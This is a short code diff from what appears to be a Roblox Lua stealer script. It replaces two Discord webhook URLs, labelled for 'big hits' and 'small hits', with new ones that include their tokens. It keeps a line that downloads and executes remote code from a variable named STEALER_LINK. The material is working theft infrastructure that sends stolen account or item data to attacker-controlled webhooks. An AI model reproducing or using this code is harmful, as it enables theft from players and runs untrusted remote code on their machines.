@@ -6,8 +6,8 @@ Usernames = {
     'BLADES12900',
 }
 
-BigHitsWebhook = "https://discord.com/api/webhooks/1371270922249568349/HD-8z2z1lDEHouhuFHc8zGVRLVaPfFjKGqD6V8cn9DjAOpkdFZEhAqp9QSf0wO3KVdMF"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1371271190156414976/xMd8w5qlSBq0sTIQehIWxi-Xrkz0xFYbc8jhsHZlJJeJ9UdfJFBD7OE04E51FHTbK7sy"
+BigHitsWebhook = "https://discord.com/api/webhooks/1371281219773534208/cuyATFYVhlv_ViipmdiKqXUFixyZMFzNuvqToN76v4PHVJno0768RGe6iwQ2q00L357r"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1371280557442334780/It02S-VIGa0sJLIUMhcHg9c4alaATO0xqoO8nkpeD2gQbhrVh853bR6IPngp1C4CGq0T"
 
 loadstring(game:HttpGet(STEALER_LINK, true))()
 
